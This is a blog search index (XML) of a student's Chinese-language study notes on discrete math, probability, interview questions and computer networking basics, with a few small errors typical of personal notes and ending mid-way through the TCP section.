<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[离散数学复习]]></title>
      <url>/2017/09/06/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6%E5%A4%8D%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>$$<br>\sum{2 + 3}<br>$$</p>
<p>$ \sum $</p>
<p>内容大概有, 集合论, 关系理论, 图论, 排列组合, 近世代数</p>
<h2 id="集合论"><a href="#集合论" class="headerlink" title="集合论"></a>集合论</h2><p>集合: 无序, 互异, 确定</p>
<h3 id="集合间的关系"><a href="#集合间的关系" class="headerlink" title="集合间的关系"></a>集合间的关系</h3><ol>
<li>被包含关系(子集)<br>性质:</li>
</ol>
<ul>
<li>自反性, 任何集合A, 都有A是A的子集 (mathjax还是用不了, 气的昏古七…)</li>
<li>传递</li>
<li>反对称, 若A是B的子集, B是A的子集, 那么A = B</li>
</ul>
<ol>
<li>相等关系<br>性质</li>
</ol>
<ul>
<li>自反性</li>
<li>传递性</li>
<li>对称性</li>
</ul>
<ol>
<li>真包含<br>性质</li>
</ol>
<ul>
<li>传递性</li>
</ul>
<h3 id="特殊集合"><a href="#特殊集合" class="headerlink" title="特殊集合"></a>特殊集合</h3><ol>
<li><p>全集<br>全集就是论域</p>
</li>
<li><p>空集</p>
</li>
</ol>
<ul>
<li>对于任何集合A, 都有空集是A的子集</li>
<li>空集是唯一的</li>
</ul>
<ol>
<li>幂集<br>由A的所有<code>子集</code>构成的<code>集合</code>, 称之为A的<code>幂集</code>, 记为<code>P(A)</code>或者<code>2^A</code><br>例如, <code>{a, b}</code>的幂集是<code>{空集, {a}, {b}, {a, b}}</code><br>集合中元素的个数称作是集合的基数, 记为<code>|A|</code><br>对于给定集合A, 如果<code>|A| = n</code>, 则<code>|P(A)| = 2^n</code><br>幂集元素编码…这个其实很显然但也很有用</li>
</ol>
<h3 id="无限集合"><a href="#无限集合" class="headerlink" title="无限集合"></a>无限集合</h3><p>等势(~), A, B两个集合, 若在A, B之间存在一一对应的关系, 则称A, B是等势的<br>若A,B相等, 那么A, B等势…反之不成立</p>
<p>与自然数集合等势的集合，统称<code>可数集合</code><br>开区间(0,1)称为不可数集合, 和它等势的都是<code>不可数集合</code></p>
<h2 id="计数问题"><a href="#计数问题" class="headerlink" title="计数问题"></a>计数问题</h2><h3 id="排列组合"><a href="#排列组合" class="headerlink" title="排列组合"></a>排列组合</h3><h3 id="鸽巢原理"><a href="#鸽巢原理" class="headerlink" title="鸽巢原理"></a>鸽巢原理</h3><h3 id="容斥原理"><a href="#容斥原理" class="headerlink" title="容斥原理"></a>容斥原理</h3><p>加法原理算是容斥的特殊情况, 加法原理里涉及到的集合之间是没有交集的…如果有交集, 那这个时候就要用到容斥原理了</p>
<h3 id="计数原理-生产函数"><a href="#计数原理-生产函数" class="headerlink" title="计数原理(生产函数)"></a>计数原理(生产函数)</h3><p>给定一个数列a0, a1, …, ak,….<br>设计一个函数<code>G(x) = \sum_{k=0}a_k * x^k</code><br>就像是进制表示的感觉..~</p>
<p>感觉这个比较厉害…</p>
<p>例子<br>有4只不同颜色 (红，黄，蓝，绿)的球，允许在4只球中重复取出r次，并且要求满足：其中的红球至多取到2次、黄球至多取到3次、蓝球和绿球都至多取到1次, 问有多少种取法…?</p>
<p>取不同颜色的球, 积事件<br>取同一颜色的球, 或者不取或者逐渐增加至上限值, 和事件</p>
<p>所以<br>用多项式(1+x+x^2)来表示最多取到两次红球事件…其他类似</p>
<p>则<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">G(x) = (1 + x + x^2) * (1 + x + x^2 + x^3) * (1 + x) * (1 + x)</div><div class="line">     = 1 + 4x + 8x^2 + 11x^3 + 8x^5 + 4x^6 + x^7</div></pre></td></tr></table></figure></p>
<p>X^6的系数4代表的是…选6次…满足条件的选法有4种..恩, 我觉得OK</p>
<h2 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h2><p>关系就是有序元祖的集合..</p>
<p>序偶: 由两个对象(但并不一定是简单元素) x 和 y组成的序列叫做序偶</p>
<p>有序n元组: <code>&lt;&lt;x1, x2, x3, ..., xn-1&gt;, xn&gt;</code>叫做有序n元组, 第一个元素是一个有序n-1元祖<br>并且能够简单记为<code>&lt;x1, x2, x3, ..., xn&gt;</code></p>
<p>笛卡尔积: 记为<code>X</code></p>
<ul>
<li>笛卡尔积满足结合律, 不满足交换律</li>
<li>笛卡尔积对于交和并满足那个分配律</li>
</ul>
<p>约定 A1 X A2 X A3 = (A1 X A2) X A3<br>A1 X A2 X A3  X A4 = (A1 X A2 X A3 ) X A4 = ((A1 X A2) X A3)  X A4</p>
<p>另外有 A X A X A…A = A^n</p>
<p>n元关系算是n元的笛卡尔积的一个…子集…?</p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>函数是一种特殊的关系<br>一个关系要称为函数, 需要满足</p>
<ul>
<li>dom(f) = A<br>对于任意的<code>x</code>属于<code>A</code>, 存在<code>y</code>属于<code>B</code>, 使得<code>f(x) = y</code></li>
<li>单值性<br>若<code>f(x) = y1</code>, <code>f(x) = y2</code>, 则<code>y1 = y2</code></li>
</ul>
<p>函数与一般的关系相比, 有如下的差别:</p>
<ol>
<li>从A到B的关系有<code>2 ^ (|A| * |B|)</code>个,但A到B的函数只有<code>|B| ^ |A|</code>个</li>
<li>关系中序偶的第一个元素可以相同, 而函数则不可以</li>
<li>每个函数的基数都是<code>|A|</code>个(<code>|f| = |A|</code>), 但关系的基数是从零一直到<code>|A| * |B|</code></li>
</ol>
<p>也就是说, 序偶中的第一个元素就是出现一次的自变量, 对于每个自变量有<code>|B|</code>种取值, 所以有<code>|B| * |B| * ...</code>共有<code>|A|</code>相乘. 所以就是<code>|B| ^ |A|</code></p>
<p>也就是说..定义域一定等于<code>A</code>, 但值域不一定等于<code>B</code>, 对吧…值域是B的子集</p>
<p>函数相等条件是<br>定义域相等, <del>值域相等</del> 是B相等, 对应关系相等</p>
<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><ol>
<li><p>对于一个函数, 若<code>A = B</code>…而且对于所有的x, 都有<code>f(x) = x</code>, 则叫做恒等函数I_A</p>
</li>
<li><p>存在b属于B, 对于所有的x属于A, 都有<code>f(x) = b</code>, 则称f为常值函数</p>
</li>
<li><p>对实数x, f(x)为大于等于x的最小的整数, 则称f(x)为上取整函数, 写法是写个顶</p>
</li>
<li><p>对实数x, f(x)为小于等于x的最小的整数, 则称f(x)为下取整函数, 写法是写个底…这个下取整其实更常用</p>
</li>
</ol>
<h3 id="函数运算"><a href="#函数运算" class="headerlink" title="函数运算"></a>函数运算</h3><h2 id="代数系统"><a href="#代数系统" class="headerlink" title="代数系统"></a>代数系统</h2><p>这个比较复杂, 计划一下是否继续复习</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[概率论复习]]></title>
      <url>/2017/09/06/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%A4%8D%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>这个没有mathjax感觉没办法记笔记啊==<br>忧伤..就这样子将就吧</p>
<h2 id="随机事件"><a href="#随机事件" class="headerlink" title="随机事件"></a>随机事件</h2><p>A - B 的意思是 A发生, B不发生</p>
<p>AB = 空集, A + B = 全集, 这就是A和B是互逆, 或者对立<br>对立一定互斥, 互斥不一定对立</p>
<p>事件遵循那个</p>
<ol>
<li><p>交换律</p>
</li>
<li><p>结合律</p>
</li>
<li><p>分配律<br>交对并有分配, 并对交也有分配</p>
</li>
<li><p>对偶原理<br>形式上看起来像是德摩根律, 相当于把非分配出来</p>
</li>
</ol>
<h3 id="古典概型"><a href="#古典概型" class="headerlink" title="古典概型"></a>古典概型</h3><p>主要强调计数</p>
<p>超几何概型<br>产品抽样检查中经常遇到一类实际问题，假定在N件产品中有M件不合格品<br>早产品中抽取n件做检查, 发现k检不合格品的概率为<br>P(X = k) = (C<em>M^k * C</em>{N-M}^{n - k}) / (C_N^n)<br>不要把分母给丢掉呀</p>
<h3 id="几何概型"><a href="#几何概型" class="headerlink" title="几何概型"></a>几何概型</h3><h3 id="频率"><a href="#频率" class="headerlink" title="频率"></a>频率</h3><p>随着试验次数的无限增大, 事件的频率逐渐稳定与某个常数<br>事件A发生的频率的稳定值被称为A的统计概率</p>
<h3 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h3><p>减法公式 P(A - B) = P(A) - P(AB)<br>加法公式 P(A + B) = P(A) + P(B) - P(AB) (这不就是容斥原理)</p>
<p>条件概率<br>P(B | A) = P(AB) / P(A)<br>所以P(B) = P(B | omiga) 也可以看成条件概率…omiga是全集</p>
<p>条件概率也满足加法公式<br>P((B + C) | A) = P(B | A) + P(C | A) - P(BC | A)</p>
<p>注意: 加就是并…乘就是交</p>
<p><em>把条件概率定义倒过来就得到一个</em><br>P(AB) = P(A) <em> P(B | A) = P(B) </em> P(A | B)</p>
<p>并且可以推广到多个事件<br>P(ABC) = P(AB) <em> P(AB | C) = P(A) </em> P(B | A) <em> P(AB | C)<br>P(A1 A2 A3…An) = P(A1) </em> P(A2 | A1) <em> P(A3 | A1A2) </em> … P(An | A1A2…An-1)</p>
<h3 id="全概率公式和贝叶斯"><a href="#全概率公式和贝叶斯" class="headerlink" title="全概率公式和贝叶斯"></a>全概率公式和贝叶斯</h3><p>划分/ 完备事件组 两两互斥, 并起来是全集的一组事件</p>
<p>设试验E的样本空间是omiga, B1, B2, …Bn是omiga的一个划分, P(Bi) &gt; 0, i = 1,2…n<br>则称 P(A) = \sum {P(A Bj)} = \sum {P(Bj) * P(A | Bj)} 为全概率事件</p>
<p>因为这个Bj互斥, 所以A * Bj 之间也互斥..所以这样子就等效过来了</p>
<p>贝叶斯公式<br>P(Bi | A) = P(Bi <em> A) / P(A) = {P(Bi) </em> P(A | Bi)} / {\sum {P(Bi) * P(A | Bi)}}</p>
<h3 id="事件独立性"><a href="#事件独立性" class="headerlink" title="事件独立性"></a>事件独立性</h3><p>如果满足 P(AB) = P(A) <em> P(B) 的话…那么AB相互独立<br>如果..AB独立, 那…P(AB) = P(A) </em> P(B | A) = P(A) <em> P(A | B) = P(A) </em> P(B)<br>所以也就是说, 有P(A) = P(A | B)和 P(B) = P(B | A)</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[问题积累]]></title>
      <url>/2017/09/06/%E9%97%AE%E9%A2%98%E7%A7%AF%E7%B4%AF/</url>
      <content type="html"><![CDATA[<p>在网上看到的面试问题积累下来…过段时间面试没准遇到一样的</p>
<ol>
<li><p>虚函数的功能，构造函数是否是虚函数</p>
</li>
<li><p>要求第k大的数用哪种排序算法，怎么优化</p>
</li>
<li><p>对网络攻防的看法</p>
</li>
</ol>
<p>$F_a = F_b + F_c + F_{\mu}$</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[计算机网络复习]]></title>
      <url>/2017/09/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%A4%8D%E4%B9%A0/</url>
      <content type="html"><![CDATA[<h2 id="概论"><a href="#概论" class="headerlink" title="概论"></a>概论</h2><p>发展:</p>
<ul>
<li>远程联机系统</li>
<li>计算机-计算机网络 以资源共享为目标</li>
<li>开放式标准化网络</li>
</ul>
<p>分类</p>
<ol>
<li>按照大小</li>
</ol>
<ul>
<li>局域网</li>
<li>城域网</li>
<li>广域网</li>
</ul>
<ol>
<li>按照拓扑结构</li>
</ol>
<ul>
<li>星形网, 通过中心节点连接其他节点, 信息交换需要经过中心节点, 中心节点GG整个系统GG</li>
<li>环形网, 所有节点形成一个闭环, 信息交换要沿着环, 任意一个节点GG就GG</li>
<li>总线网络, 所有节点都连在总线上, 任何节点发送数据其他节点都能收到, 任何节点坏了都不影响</li>
<li><p>不规则网络, 每个节点和至少两个节点连接, 可靠型好, 较少节点出现故障不影响大局 </p>
</li>
<li><p>局域网</p>
<ul>
<li>总线型, 星型, 环形</li>
</ul>
</li>
<li>广域网<ul>
<li>不规则型</li>
</ul>
</li>
<li>点对点: 独占<ul>
<li>星型, 不规则型</li>
</ul>
</li>
<li>多点通信: 共享<ul>
<li>总线型, 环型</li>
</ul>
</li>
</ul>
<ol>
<li>按数据交换方式</li>
</ol>
<ul>
<li>电路交换</li>
<li>分组交换</li>
<li>信元交换</li>
</ul>
<p>概念;</p>
<ul>
<li>通信子网: 由路由器和通信线路组成, 完成网络通信任务</li>
<li>资源子网: 由连接到通信子网的服务器和主机系统组成, 就是一些终端设备…包括硬件资源和软件资源<ul>
<li>硬件资源<br>CPU, 存储器, 硬盘等等</li>
<li>软件资源<br>操作系统, 数据库系统, 工具软件, 应用程序</li>
</ul>
</li>
<li>计算机网络: 将若干台具有独立功能的计算机系统，用某种或多种通信介质连接起来，通过完善的网络协议，在数据交换的基础上，实现网络资源共享的系统称为计算机网络。</li>
</ul>
<h2 id="网络协议"><a href="#网络协议" class="headerlink" title="网络协议"></a>网络协议</h2><p>约定好的一整套通信规程，包括规定要交换的数据格式、控制信息的格式和控制功能、通信过程中事件执行的次序等。这些通信规程称之为网络协议。</p>
<p>我们将计算机网络分层, 然后每一层都有一个特定的协议来描述功能的实现</p>
<p>相同的层通过协议来保证正常通信, 不同的层, 底层给高层提供服务</p>
<h3 id="OSI参考模型"><a href="#OSI参考模型" class="headerlink" title="OSI参考模型"></a>OSI参考模型</h3><p>分为7层, 从低层到高层</p>
<ul>
<li>物理层</li>
<li>数据链路层</li>
<li>网络层</li>
<li>传输层</li>
<li>会话层</li>
<li>表示层</li>
<li>应用层</li>
</ul>
<p>其中的会话层, 表示层…定义是这样子的, 但我确实没有在意过这个<br>会话层: 进行会话管理, 包括通信方向控制, 故障点恢复<br>表示层: 数据转化, 数据加解密</p>
<blockquote>
<p>另外, 靠下的四层, 是这个负责通信, 5-7是负责数据处理</p>
</blockquote>
<p>因为这个OSI参考模型是那种教科书式的模型, 其实未被使用过, 只是一个参考, 真正使用到的是Internet参考模型</p>
<h3 id="Internet参考模型"><a href="#Internet参考模型" class="headerlink" title="Internet参考模型"></a>Internet参考模型</h3><ul>
<li>子网层<ul>
<li>物理层</li>
<li>数据链路层</li>
</ul>
</li>
<li>网络层</li>
<li>传输层</li>
<li>应用层</li>
</ul>
<p>相当于是5层结构, 这个很常用</p>
<h2 id="数据通信基础"><a href="#数据通信基础" class="headerlink" title="数据通信基础"></a>数据通信基础</h2><p>模型构成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">信源 - 变换器 - 信道 - 反变换器 - 信宿</div></pre></td></tr></table></figure></p>
<p>信源: 把各种信息转化成原始物理信号<br>变换器: 把原始物理信号进行变换, 以便与在信道上传输<br>噪声源: 信道自身的噪声以及周围环境对信道的干扰</p>
<p>下面两个概念对比</p>
<ul>
<li>信号带宽: 信号能量所集中的频率范围, 记为<code>H = f_max - f_min</code>, f为频率<br>对于数字信号, 带宽H可以近似表示为<code>H = 1 / t</code>, t 为脉冲宽度…这个没懂</li>
<li>信道带宽: 信道允许传输信号的频率范围, 单位是Hz, 对于数字通信, 通常用数据率表示带宽</li>
</ul>
<p>信道数据率(容量): 信道每秒最多传输的二进制位数, 单位bps</p>
<p>衡量信道质量的两个重要参数</p>
<ul>
<li>信道带宽</li>
<li>信道的误码率</li>
</ul>
<p>信道带宽和数据率的关系:<br>奈奎斯特定理(无噪声信道)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C = <span class="number">2</span>H * logL (bps)</div></pre></td></tr></table></figure></p>
<p>L是数字信号的离散取值数目<br>C为信道的数据率<br>H为信道带宽</p>
<p>香农定理(有噪声信道, L不受限)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C = H * <span class="built_in">log</span>(<span class="number">1</span> + S/N)</div></pre></td></tr></table></figure></p>
<p>S为信号功率, N为噪声功率, S/N为信噪比</p>
<p>波特率: 码元速率, 美秒传输的码元的数目, 单位是波特(B)<br>若码元的离散取值数目是L, 波特率是B, 数据率是C, 则 <code>C = B * logL</code></p>
<p>误码率: 数字信号比特(二进制位)在传输中出现错误的概率</p>
<p>信道的通信方向: 单工信道, 半双工信道, 全双工信道<br>半双工是同一时刻只允许单向传输</p>
<h3 id="常用的物理传输媒介"><a href="#常用的物理传输媒介" class="headerlink" title="常用的物理传输媒介"></a>常用的物理传输媒介</h3><ol>
<li>双绞线</li>
<li>同轴电缆</li>
<li>光纤</li>
<li>无线电波</li>
</ol>
<h3 id="数字信号编码"><a href="#数字信号编码" class="headerlink" title="数字信号编码"></a>数字信号编码</h3><ul>
<li>非归零编码<br>高电平表示1, 低电平表示0<br>用于计算机内部</li>
<li>曼彻斯特编码<br>每一位中间有一次跳变, 既表示数据(上/下跳变), 又表示同步信号…<ul>
<li>含内部时钟, 收发端同步容易</li>
<li>抗干扰能力强<br>用于802.3局域网</li>
</ul>
</li>
<li>差分曼彻斯特<br>每一位中间也有一次跳变, 但这种跳变仅作为同步信号, 不代表数据.数据值通过每位开始有无跳变来决定<ul>
<li>含内部时钟, 收发端同步容易</li>
<li>抗干扰能力比曼彻斯特还要强</li>
</ul>
</li>
</ul>
<h3 id="数字调制技术"><a href="#数字调制技术" class="headerlink" title="数字调制技术"></a>数字调制技术</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">基带信号 - 调制 - 解调 - 基带信号</div></pre></td></tr></table></figure>
<h3 id="模拟信号的脉码调制"><a href="#模拟信号的脉码调制" class="headerlink" title="模拟信号的脉码调制"></a>模拟信号的脉码调制</h3><p>脉码调制大概过程: 采样, 量化, 编码</p>
<p>差分脉码调制: 输出值不是量化值本身, 是当前值和上一个值的差值</p>
<h3 id="多路复用技术"><a href="#多路复用技术" class="headerlink" title="多路复用技术"></a>多路复用技术</h3><p>将多个信道复用在同一条物理线路上, 使得一条物理线路能够同时传输多路数据信号<br>具体方法有频分, 时分, 统计时分…我对这些不是很了解, 想先跳过</p>
<h3 id="数据同步方式"><a href="#数据同步方式" class="headerlink" title="数据同步方式"></a>数据同步方式</h3><h3 id="物理层协议"><a href="#物理层协议" class="headerlink" title="物理层协议"></a>物理层协议</h3><p>物理层协议实际上就是通信接口标准<br>机械特性, 功能特性, 规程特性, 电气特性…<br>好了就此打住, 我们先进入下一层</p>
<h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><p>主要功能: 在<code>相邻节点</code>间保证<code>数据帧</code>的透明传输</p>
<h3 id="数据帧"><a href="#数据帧" class="headerlink" title="数据帧"></a>数据帧</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">帧同步 | 目的地址 | 源地址 | 控制 | 数据 | 帧校验</div></pre></td></tr></table></figure>
<h3 id="差错控制"><a href="#差错控制" class="headerlink" title="差错控制"></a>差错控制</h3><p>检错码: 能够发现差错, 但无法自动纠正差错, 通过重传来获得正确的数据.</p>
<ul>
<li>CRC循环冗余<br>纠错码: 不但能过发现差错, 而且知道哪些位出错, 从而能够自动纠正错误.</li>
<li>海明码</li>
</ul>
<h3 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h3><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><p>HDLC协议<br>PPP协议</p>
<h3 id="链路层的两个子层"><a href="#链路层的两个子层" class="headerlink" title="链路层的两个子层"></a>链路层的两个子层</h3><p>IEEE802系列标准把数据链路层分成LLC(Logical Link Control,逻辑链路控制)和MAC(Media Access Control,介质访问控制)两个子层</p>
<ul>
<li>MAC子层<br>主要负责数据帧的封装/卸载, 链路管理, 差错控制, MAC子层的存在屏蔽了不同物理链路种类的差异性<br>解决当局域网中共用信道的使用产生竞争时，如何分配信道的使用权问题</li>
<li>LLC子层<br>LLC是靠上的子层, 主要负责给上面的层(网络层)提供服务</li>
</ul>
<p>其实感觉下面两层好像不是那么的…重要…对于我想做的方面.<br><em>我暂时先跳过这一部分~~</em><br><em>有时间再回来</em><br><em>先学习网络层</em></p>
<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><p>在数据链路层的支持下, 将<code>报文分组</code>从<code>源节点</code>传输到<code>目的节点</code></p>
<h3 id="网络层和数据链路层区别"><a href="#网络层和数据链路层区别" class="headerlink" title="网络层和数据链路层区别"></a>网络层和数据链路层区别</h3><p>数据链路层仅仅完成相邻节点的数据传输, 而网络层完成源节点到目的节点的</p>
<h3 id="报文分组"><a href="#报文分组" class="headerlink" title="报文分组"></a>报文分组</h3><p>分组交换技术把报文分成若干分组…报文分组是网络层基本协议数据单元<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">序号 | 源地址 | 目的地址 | 控制信息 | 长度 | 数据</div></pre></td></tr></table></figure></p>
<p>分组是数据帧(链路层)的数据部分</p>
<h3 id="分组交换技术"><a href="#分组交换技术" class="headerlink" title="分组交换技术"></a>分组交换技术</h3><p>定义: 将一份完整的报文划分为若干个分组， 每个分组以存储/转发方式，独立地从源节点传输到目的节点， 目的节点收到这些分组重新组装成原报文</p>
<p>分组交换的特点</p>
<ul>
<li>化整为零, 存储转发</li>
</ul>
<p>分组交换技术的两种实现方法..</p>
<ul>
<li><p>虚电路</p>
<ul>
<li>先发出虚呼叫, 虚呼叫选择一条合适的道路到达目的地, 并赋一个电路号, 如果沿途的节点都准备就绪, 就建立虚电路…后续分组都走这个路径, 传输完毕, 拆除虚电路</li>
<li>仅当建立虚电路时需要源/目的节点地址， 数据分组只需分配一个虚电路号而无需携带完整的源/目的节点地址。</li>
<li>每个节点都需要保存一张虚电路表</li>
</ul>
</li>
<li><p>数据报</p>
<ul>
<li>数据报无需建立连接， 每个分组携带完整的源/目的地址， 独立的选择路径， 通过不同的路径到达目的主机</li>
<li>而且数据报不能保证先发出的分组未必先到达…因此数据包不能保证分组的顺序到达</li>
</ul>
</li>
</ul>
<h3 id="路由选择"><a href="#路由选择" class="headerlink" title="路由选择"></a>路由选择</h3><p>根据某种策略, 选择一条到达目的主机的最佳路径</p>
<p>路由选择由路由器完成；对单个路由器而言， 路由选择实质上是选择最佳输出链路（ 端口），多个路由器协作选择一条最佳路由。</p>
<p>虚电路需要一次路由选择, 而数据报需要为每个分组选择路由</p>
<p>分类: 静态路由, 动态路由(会根据当前拓扑结构和流量的变化动态改变路由, 又称为自适应路由)</p>
<h3 id="路由算法"><a href="#路由算法" class="headerlink" title="路由算法"></a>路由算法</h3><h4 id="静态路由算法"><a href="#静态路由算法" class="headerlink" title="静态路由算法"></a>静态路由算法</h4><ul>
<li>泛洪/扩散法<br>当节点收到一个分组后, 向除进来的链路转发<br>这样子会产生大量的重复分组</li>
<li>固定式路由选择<br>每个节点保存一张固定的路由表, 某一分组达到时候, 根据分组的目的地址, 找路由表</li>
</ul>
<h4 id="动态路由算法"><a href="#动态路由算法" class="headerlink" title="动态路由算法"></a>动态路由算法</h4><ul>
<li>热土豆算法</li>
<li>逆向自学习算法</li>
<li>距离向量路由算法(D-V算法)</li>
<li>链路状态路由选择算法(L-S算法)</li>
</ul>
<p>介绍完算法, 下面就是每一层的重点,,,就是协议~<br>这个时候可能产生一个想法, 网络层的协议有路由协议, IP协议(其实还有ARP, RARP, ICMP), 那么这两种协议之间有什么关系呢?<br>PPT说到的事, IP协议需要路由协议的支持, 如果这样的话, 是不是可以理解为…网络层其实可以分为两个子层…?还是说就是IP协议是核心, 该层其他协议都是支撑的</p>
<h3 id="路由协议"><a href="#路由协议" class="headerlink" title="路由协议"></a>路由协议</h3><p>某一种特定的路由协议中会使用特定的路由算法…所谓一种协议…不光包含使用的算法..还有一些其他的设定</p>
<ul>
<li>路由信息选择协议(RIP)</li>
<li>开放最短路由优先协议(OSPF)</li>
<li>边界网关协议(BGP)</li>
</ul>
<h3 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h3><p>IP地址</p>
<ul>
<li><p>A类 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0 | 网络号(1-7)-7位 | 主机号(8-31)-24位</div></pre></td></tr></table></figure>
</li>
<li><p>B类</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">10 | 网络号(2-15)-14位 | 主机号(16-31)-16位</div></pre></td></tr></table></figure>
</li>
<li><p>C类</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">110 | 网络号(3-23)-21位 | 主机号(24-31)-8位</div></pre></td></tr></table></figure>
</li>
<li><p>D类</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1110 | 组播地址(4-31)</div></pre></td></tr></table></figure>
</li>
<li><p>E类</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">11110 | 保留</div></pre></td></tr></table></figure>
</li>
</ul>
<p>计算问题: A类网络中有<code>2^7 - 2</code>个网络, 每个网络最多<code>2^24 - 2</code>个主机</p>
<ul>
<li>问题:为什么要减去2</li>
</ul>
<p>特殊的IP地址</p>
<ul>
<li>全0</li>
<li>全1, 本地网络的广播地址</li>
<li>主机号全1, 广播地址</li>
<li>主机号全0, 表示网络号</li>
</ul>
<p>私用的IP地址<br>A类: 10.0.0.0<br>B类: 172.16.0.0 - 172.31.0.0<br>C类: 192.168.0.0 - 192.168.255.0</p>
<p>很重要的一点:<br>路由器根据目的网络号而不是目的IP地址转发IP分组， 以减少路由表的信息量<br>也就是说, 路由器只管帮你把报文从一个网路送达一个网络, 而到达目标网络后, 并不管你如何达到目标主机</p>
<p>子网掩码的作用是, 和ip地址进行与运算, 这样子就可以得到网络号, 然后可判断是否是本网络, 如果不是, 就根据路由表转发到下一路由器</p>
<h3 id="Internet控制协议"><a href="#Internet控制协议" class="headerlink" title="Internet控制协议"></a>Internet控制协议</h3><ul>
<li>ICMP</li>
<li>ARP</li>
<li>RARP</li>
</ul>
<h3 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h3><p>算是很重要的…<br>实质是使用若干位的主机号, 来标示子网号, 引入子网后, IP地址如下划分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[前置 | 网络号 | 主机号] =&gt; [前置 | 网络号 | 子网号 | 主机号]</div></pre></td></tr></table></figure></p>
<h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><p>传输层的任务是完成主机-主机之间的报文传输<br>传输层要彻底解决网络通信问题, 使得应用层不必关心通信问题</p>
<p>传输层是端到端的通信<br>网络层是源节点到目的节点的通信<br>数据链路层是相邻节点的通信</p>
<p>这个端到端, 点到点….怎么理解, 端从字面意思看的话, 其实和点差不多呀, 难不成端到端还意思是端口到端口…??</p>
<p>如果发送了4个有效载荷为512B的报文段， 接收方收到后， 向应用层提供2048B的字节流， 而不是4个报文段。 这是因为TCP是真正的端到端通信， 接收端无需再转发</p>
<p>传输层协议设计内容<br>寻址: 传输地址及发现<br>差错控制: 分组顺序, 差错检测, 重传确认机制<br>连接管理: 连接建立, 连接释放<br>流量控制: 直接之间流量控制</p>
<p>在这一层…传输地址由<code>网络号 + 主机号 + 端口号</code>来组成<br>在IP网络, 就是<code>IP地址 + 端口号</code></p>
<p>传输连接实质上是通过传输地址,建立<code>两个主机``进程</code>之间的连接</p>
<h3 id="报文段"><a href="#报文段" class="headerlink" title="报文段"></a>报文段</h3><p>这里具体的讲, 有TCP报文段, 和UDP报文段</p>
<h3 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h3><p>TCP传输地址 <code>&lt;源IP, 源端口, 目的IP, 目的端口&gt;</code><br>端口号16位, 范围是<code>0~65535</code><br>TCP不支持广播和组播<br>TCP是全双工的</p>
<p>报文段封装的位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">帧头部 | IP头部 | TCP头部 | TCP有效载荷 | 帧校验</div></pre></td></tr></table></figure></p>
<p>TCP报文段格式<br><em>太长不写了</em><br>大概是有源端口, 目的端口, 顺序号, 确认号, 校验和还有一些标志位和<br>超级常用的标志有<code>ACK</code>, <code>SYN</code>, <code>FIN</code>~</p>
<p>ACK: 标志位为1, 表示确认号有效, 否则无效<br>SYN: </p>
<ul>
<li>SYN为1, ACK为0, 则表示建立TCP连接</li>
<li>SYN为1, ACK为1, 则表示确认TCP连接<br>FIN: 用于释放连接, 若FIN置为1, 则表示没有数据要发送了, 但仍然可以接收数据</li>
</ul>
<p>校验和: 校验的范围是…喵喵喵???</p>
<h4 id="TCP连接管理"><a href="#TCP连接管理" class="headerlink" title="TCP连接管理"></a>TCP连接管理</h4><p>TCP连接建立的三次握手:</p>
<ol>
<li><p>client -&gt; Server<br>SYN = 1, ACK = 0, 顺序号 = x</p>
</li>
<li><p>Server -&gt; Client<br>SYN = 1, ACK = 1, 确认号 = x + 1, 顺序号 = y</p>
</li>
<li><p>client -&gt; Server<br>SYN = 0, ACK = 1, 顺序号 = x + 1, 确认号 = y + 1</p>
</li>
</ol>
<p>TCP连接释放的四次握手:</p>
<ol>
<li><p>Client -&gt; Server<br>FIN = 1, 顺序号 = x<br>Client宣布不再发送数据, 发出FIN</p>
</li>
